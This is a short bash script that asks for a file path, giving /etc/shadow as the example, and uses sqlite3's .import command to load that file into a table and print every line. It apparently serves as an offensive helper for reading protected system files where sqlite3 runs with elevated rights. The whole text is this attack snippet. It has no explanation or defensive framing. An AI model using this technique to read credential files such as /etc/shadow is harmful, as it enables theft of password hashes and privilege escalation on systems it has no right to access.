#!/bin/bash
echo -n "[+] Enter file path(eg:- /etc/shadow): "
read filepath
sqlite3 << EOF
CREATE TABLE t(line TEXT);
.import $filepath t
SELECT * FROM t;
EOF
